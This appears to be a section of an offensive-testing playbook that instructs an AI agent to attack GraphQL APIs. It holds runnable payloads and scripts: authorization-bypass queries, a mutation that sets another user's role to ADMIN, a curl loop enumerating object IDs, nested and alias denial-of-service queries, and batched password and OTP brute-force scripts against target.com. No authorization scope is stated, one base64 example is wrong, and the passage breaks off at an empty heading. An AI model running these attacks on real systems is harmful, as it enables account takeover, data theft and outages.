# GraphQL Protocol Security: Authorization & Query Attacks — Agent Chunk 32b
> Source: 08-protocol-specific-research.md
> Purpose: Test GraphQL APIs for field-level and object-level authorization bypass, query complexity/depth attacks for DoS, batching abuse to bypass rate limiting, and injection attacks in arguments
> Context Window: Small (optimized for ~8K-12K tokens)

## Agent Instructions
Test authorization: request fields that should be restricted per role, test nested object resolution across trust boundaries, test mutation authorization with regular user tokens. Test query complexity: send deeply nested queries (circular references like user->friends->user), wide queries (all fields of all types), alias-based DoS (repeat same query 100x with aliases). Test batching: send array of queries to bypass per-request rate limiting. Test injection in string/filter arguments (SQL, NoSQL, regex injection).

---

### 2.4 Authorization Vulnerabilities

GraphQL authorization is notoriously difficult to implement correctly because of the graph-traversal nature of queries.

#### Field-Level Authorization Bypass

```graphql
# Direct query — blocked by authorization
query {
  user(id: "other-user-id") {
    email          # Returns null or error — field-level auth works
    ssn            # Returns null or error
    password       # Returns null or error
  }
}

# Indirect access through a relationship — may bypass field-level auth
query {
  post(id: "some-post-id") {
    author {
      email        # Same field, accessed through post -> author
      ssn           # Resolver might not check auth on nested access
      password      # Resolver might not check auth on nested access
    }
  }
}

# Another path to the same data
query {
  organization(id: "org-1") {
    members {
      email
      ssn
      apiKeys {
        key
        secret
      }
    }
  }
}
```

#### Nested Object Authorization Bypass

```graphql
# Authorization checked at the top level but not for nested objects
query {
  me {
    organization {
      # Can the user see all org members?
      members {
        id
        name
        email
        # Can the user see each member's private data?
        privateMessages {
          content
          sender { email }
        }
        # Can the user see each member's API keys?
        apiKeys { key, secret }
      }
    }
  }
}

# Deeply nested access pattern
query {
  user(id: "my-id") {
    friends {
      friends {
        # Can I see friends-of-friends' private data?
        privateMessages { content }
        financialRecords { balance, transactions { amount } }
      }
    }
  }
}
```

#### Mutation Authorization Bypass

```graphql
# Check if mutations enforce authorization independently of queries
mutation {
  updateUser(id: "other-user-id", input: {
    role: ADMIN
    email: "attacker@evil.com"
  }) {
    id
    role
    email
  }
}

# Mass assignment through mutations
mutation {
  updateProfile(input: {
    name: "Normal Update"
    role: "admin"             # Extra field — should be rejected
    is_verified: true          # Extra field
    subscription_tier: "enterprise"  # Extra field
  }) {
    name
    role
    is_verified
  }
}

# Delete mutation IDOR
mutation {
  deleteUser(id: "other-user-id")
}
```

#### Relay Node Interface IDOR

The Relay specification defines a `node` interface that allows fetching any object by its global ID:

```graphql
# Relay's node interface — fetch ANY object by global ID
query {
  node(id: "VXNlcjoxMjM=") {  # Base64 of "User:123"
    ... on User {
      id
      email
      role
      ssn
    }
  }
}

# Enumerate different object types
# Base64 decode the ID to understand the pattern: "Type:NumericID"
# "VXNlcjox" = "User:1"
# "VXNlcjoY" = "User:2"
# "T3JkZXI6MQ==" = "Order:1"

# Iterate over IDs
for i in $(seq 1 1000); do
  ID=$(echo -n "User:$i" | base64)
  curl -s -X POST https://target.com/graphql \
    -H "Content-Type: application/json" \
    -d "{\"query\":\"{node(id:\\\"$ID\\\"){...on User{id,email,role}}}\"}"
done
```

### 2.5 Query Complexity Attacks

GraphQL's flexibility allows constructing queries that consume enormous server resources.

#### Deep Nesting DoS

```graphql
# Circular reference exploitation
# If User has friends: [User] and each User has friends: [User]
{
  user(id: "1") {
    friends {
      friends {
        friends {
          friends {
            friends {
              friends {
                friends {
                  friends {
                    friends {
                      friends {
                        name
                        email
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
# Each nesting level multiplies the query cost by the average friend count
# 10 levels with 100 friends each = 100^10 = 10^20 potential objects
```

#### Alias-Based DoS

```graphql
# Aliases run the same expensive query multiple times in one request
{
  a1: expensiveSearch(query: "test1") { results { title, content } }
  a2: expensiveSearch(query: "test2") { results { title, content } }
  a3: expensiveSearch(query: "test3") { results { title, content } }
  a4: expensiveSearch(query: "test4") { results { title, content } }
  # ... repeat hundreds or thousands of times
  a999: expensiveSearch(query: "test999") { results { title, content } }
}

# This is a single HTTP request but triggers 999 expensive operations
# Rate limiting by request count won't help
```

#### Fragment-Based Amplification

```graphql
# Circular fragment spread (some implementations don't detect this)
fragment Spread on User {
  friends {
    ...Spread
  }
}

query {
  user(id: "1") {
    ...Spread
  }
}

# Fragment stacking for width amplification
fragment UserFields on User {
  name
  email
  role
  posts { title, content, comments { text, author { name, email } } }
}

query {
  u1: user(id: "1") { ...UserFields }
  u2: user(id: "2") { ...UserFields }
  u3: user(id: "3") { ...UserFields }
  # Each alias expands the full fragment
}
```

#### Directive-Based Amplification

```graphql
# The @skip and @include directives can be combined
query ($v: Boolean!) {
  user(id: "1") {
    name @include(if: $v)
    name @skip(if: $v)      # Duplicate field processing
    email @include(if: $v)
    email @skip(if: $v)
    # Some implementations process both paths
  }
}
```

### 2.6 Batching Attacks

GraphQL's batch query capability is a powerful attack vector:

```json
[
  {"query": "mutation { login(username: \"admin\", password: \"password1\") { token } }"},
  {"query": "mutation { login(username: \"admin\", password: \"password2\") { token } }"},
  {"query": "mutation { login(username: \"admin\", password: \"password3\") { token } }"},
  {"query": "mutation { login(username: \"admin\", password: \"password4\") { token } }"},
  {"query": "mutation { login(username: \"admin\", password: \"password5\") { token } }"}
]
```

```bash
# Generate a batch of 1000 login attempts
python3 -c "
import json
batch = []
with open('passwords.txt') as f:
    for pwd in f:
        pwd = pwd.strip()
        q = f'mutation {{ login(username: \"admin\", password: \"{pwd}\") {{ token }} }}'
        batch.append({'query': q})
print(json.dumps(batch))
" > batch_login.json

curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d @batch_login.json

# OTP brute-force via batching
python3 -c "
import json
batch = []
for otp in range(10000):
    q = f'mutation {{ verifyOTP(code: \"{otp:04d}\") {{ success, token }} }}'
    batch.append({'query': q})
print(json.dumps(batch))
" > batch_otp.json

# This sends all 10000 OTP attempts in a single HTTP request
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d @batch_otp.json
```

### 2.7 Injection Attacks in GraphQL
